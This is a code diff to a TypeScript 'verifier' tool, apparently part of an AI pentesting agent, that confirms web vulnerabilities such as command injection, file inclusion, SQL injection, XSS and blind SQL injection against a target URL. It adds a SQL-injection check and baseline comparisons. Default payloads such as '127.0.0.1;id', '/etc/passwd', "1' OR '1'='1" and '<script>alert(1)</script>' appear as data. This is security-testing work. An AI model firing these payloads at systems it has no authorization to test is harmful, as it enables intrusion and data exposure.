@@ -17,7 +17,7 @@ export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
   return {
     name: "verifier",
     label: "Verifier",
-    description: "Run deterministic verification helpers for common web vulnerability classes. Supported classes: command-injection, file-inclusion, xss-reflected, xss-stored, blind-sql-injection, weak-session-id, file-upload.",
+    description: "Run deterministic verification helpers for common web vulnerability classes. Supported classes: command-injection, file-inclusion, sql-injection, xss-reflected, xss-stored, blind-sql-injection, weak-session-id, file-upload.",
     promptSnippet: "Run a deterministic vulnerability verifier",
     promptGuidelines: [
       "Use verifier after discovering a plausible endpoint/parameter to avoid ad hoc incomplete checks.",
@@ -63,6 +63,7 @@ export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
 async function runVerifier(vulnClass: string, url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
   if (vulnClass === "command-injection") return verifyCommandInjection(url, params, headers);
   if (vulnClass === "file-inclusion") return verifyFileInclusion(url, params, headers);
+  if (vulnClass === "sql-injection") return verifySqlInjection(url, params, headers);
   if (vulnClass === "xss-reflected") return verifyReflectedXss(url, params, headers);
   if (vulnClass === "xss-stored") return verifyStoredXss(url, params, headers);
   if (vulnClass === "blind-sql-injection") return verifyBlindSql(url, params, headers);
@@ -78,25 +79,112 @@ async function runVerifier(vulnClass: string, url: string, params: any, headers:
 async function verifyCommandInjection(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
   const param = params.param || "ip";
   const payload = params.payload || "127.0.0.1;id";
+  const baselinePayload = params.baseline_payload || "127.0.0.1";
+  const baseline = await requestWithParam(url, params.method || "POST", param, baselinePayload, headers);
   const response = await requestWithParam(url, params.method || "POST", param, payload, headers);
-  const confirmed = /\buid=\d+\(|\bgid=\d+\(|www-data|root/.test(response.body);
-  return result(confirmed, confirmed ? "command output marker observed" : "no command output marker observed", response, confirmed ? "uid/gid" : undefined);
+  const marker = /\buid=\d+\([^)]*\)|\bgid=\d+\([^)]*\)|www-data|root/.exec(response.body)?.[0];
+  const baselineHasMarker = /\buid=\d+\(|\bgid=\d+\(|www-data|root/.test(baseline.body);
+  const confirmed = Boolean(marker) && !baselineHasMarker;
+  return {
+    confirmed,
+    reason: confirmed ? "command output marker observed only after injected payload" : "no command output marker observed",
+    requests: [
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
+      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
+    ],
+    details: {
+      param,
+      baseline_payload: baselinePayload,
+      injected_payload: payload,
+      baseline_length: baseline.body.length,
+      injected_length: response.body.length,
+      marker,
+      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
+    },
+  };
 }
 
 async function verifyFileInclusion(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
   const param = params.param || "page";
   const payload = params.payload || "/etc/passwd";
+  const baselinePayload = params.baseline_payload || "include.php";
+  const baseline = await requestWithParam(url, "GET", param, baselinePayload, headers);
   const response = await requestWithParam(url, "GET", param, payload, headers);
-  const confirmed = /root:x:0:0:|www-data:x:/i.test(response.body);
-  return result(confirmed, confirmed ? "local file content marker observed" : "no local file marker observed", response, confirmed ? "/etc/passwd" : undefined);
+  const marker = /root:x:0:0:[^\n<]*|www-data:x:[^\n<]*/i.exec(response.body)?.[0];
+  const confirmed = Boolean(marker) && !baseline.body.includes(marker || "\u0000");
+  return {
+    confirmed,
+    reason: confirmed ? "local file content marker observed only after traversal/include payload" : "no local file marker observed",
+    requests: [
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
+      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
+    ],
+    details: {
+      param,
+      baseline_payload: baselinePayload,
+      injected_payload: payload,
+      baseline_length: baseline.body.length,
+      injected_length: response.body.length,
+      marker,
+      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
+    },
+  };
+}
+
+async function verifySqlInjection(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
+  const param = params.param || "id";
+  const baselinePayload = params.baseline_payload || "1";
+  const payload = params.payload || "1' OR '1'='1";
+  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers);
+  const response = await requestWithParam(url, params.method || "GET", param, payload, headers);
+  const marker = /First name:|Surname:|SQL syntax|You have an error|MariaDB|MySQL|admin/i.exec(response.body)?.[0];
+  const confirmed = Boolean(marker) && meaningfulDifference(baseline.body, response.body);
+  return {
+    confirmed,
+    reason: confirmed ? "SQL payload produced database-specific or semantic response difference" : "SQL payload did not produce a meaningful difference",
+    requests: [
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
+      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
+    ],
+    details: {
+      param,
+      baseline_payload: baselinePayload,
+      injected_payload: payload,
+      baseline_length: baseline.body.length,
+      injected_length: response.body.length,
+      marker,
+      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
+    },
+  };
 }
 
 async function verifyReflectedXss(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
   const param = params.param || "name";
   const payload = params.payload || "<script>alert(1)</script>";
+  const baselinePayload = params.baseline_payload || "node2-baseline";
+  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers);
   const response = await requestWithParam(url, params.method || "GET", param, payload, headers);
-  const confirmed = response.body.includes(payload);
-  return result(confirmed, confirmed ? "payload reflected verbatim" : "payload not reflected verbatim", response, payload);
+  const reflected = response.body.includes(payload);
+  const baselineReflected = baseline.body.includes(payload);
+  const executableContext = reflected && /<pre>\s*Hello\s*<script>alert\(1\)<\/script>|<script>alert\(1\)<\/script>/i.test(response.body);
+  const confirmed = reflected && !baselineReflected && executableContext;
+  return {
+    confirmed,
+    reason: confirmed ? "payload reflected verbatim in executable HTML context" : reflected ? "payload reflected but executable context was not proven" : "payload not reflected verbatim",
+    requests: [
+      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
+      { method: response.method, url: response.url, status: response.status, marker: reflected ? payload : undefined },
+    ],
+    details: {
+      param,
+      baseline_payload: baselinePayload,
+      injected_payload: payload,
+      baseline_length: baseline.body.length,
+      injected_length: response.body.length,
+      executable_context: executableContext,
+      response_excerpt: reflected ? excerptAround(response.body, payload) : response.body.slice(0, 500),
+    },
+  };
 }
 
 async function verifyStoredXss(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
@@ -117,6 +205,13 @@ async function verifyStoredXss(url: string, params: any, headers: Record<string,
       { method: "POST", url, status: post.status },
       { method: "GET", url, status: get.status, marker: confirmed ? payload : undefined },
     ],
+    details: {
+      payload,
+      fields: Object.keys(fields),
+      post_length: post.body.length,
+      get_length: get.body.length,
+      response_excerpt: confirmed ? excerptAround(get.body, payload) : get.body.slice(0, 500),
+    },
   };
 }
 
@@ -127,14 +222,26 @@ async function verifyBlindSql(url: string, params: any, headers: Record<string, 
   const trueResponse = await requestWithParam(url, "GET", param, truePayload, headers);
   const falseResponse = await requestWithParam(url, "GET", param, falsePayload, headers);
   const confirmed = meaningfulDifference(trueResponse.body, falseResponse.body) || trueResponse.status !== falseResponse.status;
+  const trueMarker = /User ID exists|First name:|Surname:|exists/i.exec(trueResponse.body)?.[0];
+  const falseMarker = /User ID is MISSING|missing|does not exist/i.exec(falseResponse.body)?.[0];
   return {
     confirmed,
     reason: confirmed ? "controlled true/false payloads produced different responses" : "true/false payloads did not produce a meaningful difference",
     requests: [
-      { method: "GET", url: trueResponse.url, status: trueResponse.status, marker: "true-predicate" },
-      { method: "GET", url: falseResponse.url, status: falseResponse.status, marker: "false-predicate" },
+      { method: "GET", url: trueResponse.url, status: trueResponse.status, marker: trueMarker || "true-predicate" },
+      { method: "GET", url: falseResponse.url, status: falseResponse.status, marker: falseMarker || "false-predicate" },
     ],
-    details: { true_length: trueResponse.body.length, false_length: falseResponse.body.length },
+    details: {
+      param,
+      true_payload: truePayload,
+      false_payload: falsePayload,
+      true_length: trueResponse.body.length,
+      false_length: falseResponse.body.length,
+      true_marker: trueMarker,
+      false_marker: falseMarker,
+      true_excerpt: trueMarker ? excerptAround(trueResponse.body, trueMarker) : trueResponse.body.slice(0, 300),
+      false_excerpt: falseMarker ? excerptAround(falseResponse.body, falseMarker) : falseResponse.body.slice(0, 300),
+    },
   };
 }
 
@@ -223,6 +330,7 @@ async function markVerified(runtime: ToolRuntime, rawUrl: string, param: string,
 function defaultParam(vulnClass: string): string {
   if (vulnClass === "command-injection") return "ip";
   if (vulnClass === "file-inclusion") return "page";
+  if (vulnClass === "sql-injection") return "id";
   if (vulnClass === "xss-reflected") return "name";
   if (vulnClass === "xss-stored") return "txtName,mtxMessage";
   if (vulnClass === "blind-sql-injection") return "id";
@@ -235,6 +343,14 @@ function meaningfulDifference(left: string, right: string): boolean {
   if (left === right) return false;
   const delta = Math.abs(left.length - right.length);
   return delta > 20 || /exists|missing|true|false|error/i.test(`${left}\n${right}`);
+}
+
+function excerptAround(value: string, marker: string): string {
+  const index = value.indexOf(marker);
+  if (index < 0) return value.slice(0, 500);
+  const start = Math.max(0, index - 180);
+  const end = Math.min(value.length, index + marker.length + 180);
+  return value.slice(start, end).replace(/\s+/g, " ").trim();
 }
 
 function looksSequential(values: string[]): boolean {
